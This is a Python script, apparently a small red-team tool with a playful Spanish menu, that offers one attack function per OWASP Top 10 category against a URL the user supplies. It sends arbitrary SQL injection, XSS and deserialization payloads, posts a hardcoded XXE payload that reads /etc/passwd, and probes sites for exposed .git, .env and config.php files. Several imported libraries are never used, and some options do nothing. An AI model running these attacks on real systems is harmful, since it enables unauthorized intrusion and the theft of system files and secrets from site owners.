import sys
import requests
import subprocess
import os
import json
import base64
import jwt
import hashlib
from lxml import etree
from cmd import Cmd
from Crypto.Cipher import AES
from urllib.parse import urlparse, quote

def show_menu():
    print("¡Bienvenido al espectáculo de la seguridad informática de ART (Argentina Red Team)!")
    print("Hoy exploraremos las vulnerabilidades del top 10 OWASP. ¡Selecciona una para comenzar tu aventura!")
    print("1. Inyección (Injection)")
    print("2. Pérdida de autenticación (Broken Authentication)")
    print("3. Exposición de datos sensibles (Sensitive Data Exposure)")
    print("4. Entidades externas XML (XXE)")
    print("5. Control de acceso defectuoso (Broken Access Control)")
    print("6. Configuración de seguridad incorrecta (Security Misconfiguration)")
    print("7. Scripting entre sitios (XSS)")
    print("8. Deserialización insegura (Insecure Deserialization)")
    print("9. Uso de componentes con vulnerabilidades conocidas (Using Components with Known Vulnerabilities)")
    print("10. Registro y monitoreo insuficientes (Insufficient Logging & Monitoring)")
    print("0. Salir")

def execute_injection():
    url = input("Dirección del escenario para tu ataque de inyección SQL: ")
    payload = input("Tu arma secreta, el payload de SQL: ")
    response = requests.get(url, params={'input': payload})
    print("Respuesta del servidor, ¿seremos victoriosos?:")
    print(response.text)

def execute_broken_authentication():
    url = input("Escenario de combate, URL del formulario de autenticación: ")
    username = input("Identifícate, guerrero (nombre de usuario): ")
    password = input("La llave a los secretos (contraseña): ")
    data = {'username': username, 'password': password}
    session = requests.Session()
    response = session.post(url, data=data)
    print("Respuesta del servidor, ¿hemos entrado al castillo?:")
    print(response.text)

def execute_sensitive_data_exposure():
    url = input("Donde los secretos son guardados, la URL del recurso: ")
    response = requests.get(url)
    print("He aquí los tesoros expuestos:")
    print(response.text)

def execute_xxe():
    url = input("URL del reino que procesa XML: ")
    xml_payload = '''<?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo [  
    <!ELEMENT foo ANY >
    <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
    <foo>&xxe;</foo>'''
    headers = {'Content-Type': 'application/xml'}
    response = requests.post(url, data=xml_payload, headers=headers)
    print("Respuesta del servidor, ¿qué secretos revelaremos?:")
    print(response.text)

def execute_broken_access_control():
    url = input("URL del tesoro protegido: ")
    response = requests.get(url)
    print("¿Acceso concedido a lo prohibido?:")
    print(response.text)

def execute_security_misconfiguration():
    print("A la caza de la configuración perdida...")
    url = input("El dominio del dragón (URL del sitio): ")
    paths = [".git", ".env", "config.php"]
    for path in paths:
        response = requests.get(f"{url}/{path}")
        if response.status_code == 200:
            print(f"¡Tesoro encontrado! {path} es accesible")
        else:
            print(f"Guardia en la puerta, {path} no accesible")

def execute_xss():
    url = input("Campo de batalla para tu ataque XSS: ")
    payload = input("Dibuja tu espada, el payload XSS: ")
    response = requests.get(url, params={'input': payload})
    print("Respuesta del servidor, ¿hemos dejado nuestra marca?:")
    print(response.text)

def execute_insecure_deserialization():
    url = input("URL donde los objetos cobran vida: ")
    serialized_object = input("El hechizo para despertar, objeto serializado: ")
    response = requests.post(url, data=serialized_object)
    print("Respuesta del servidor, ¿hemos alterado la realidad?:")
    print(response.text)

def execute_known_vulnerabilities():
    print("Consultando el libro de los antiguos...")
    component = input("Nombre del antiguo artefacto (componente): ")
    version = input("Capítulo y versículo (versión del componente): ")
    print(f"Buscando maldiciones para {component} versión {version}...")

def execute_logging_monitoring():
    print("Descifrando los rollos antiguos...")
    log_file = input("Dónde guardan los secretos (ruta del archivo de log): ")
    try:
        with open(log_file, 'r') as file:
            logs = file.read()
            print("Secretos revelados en el archivo de log:")
            print(logs)
    except Exception as e:
        print(f"El pergamino está corrupto (error al leer el archivo de log): {e}")

def main():
    while True:
        show_menu()
        choice = input("Selecciona tu destino (ingresa el número): ")

        if choice == '1':
            execute_injection()
        elif choice == '2':
            execute_broken_authentication()
        elif choice == '3':
            execute_sensitive_data_exposure()
        elif choice == '4':
            execute_xxe()
        elif choice == '5':
            execute_broken_access_control()
        elif choice == '6':
            execute_security_misconfiguration()
        elif choice == '7':
            execute_xss()
        elif choice == '8':
            execute_insecure_deserialization()
        elif choice == '9':
            execute_known_vulnerabilities()
        elif choice == '10':
            execute_logging_monitoring()
        elif choice == '0':
            print("Hasta la próxima, valiente guerrero...")
            print("Recuerda: ¡Usa este poder para el bien! © ART (Argentina Red Team), todos los derechos reservados.")
            sys.exit()
        else:
            print("Ese no es un número mágico, intenta de nuevo.")

if __name__ == "__main__":
    main()
    print("Recuerda: ¡Usa este poder para el bien! © ART (Argentina Red Team), todos los derechos reservados.")
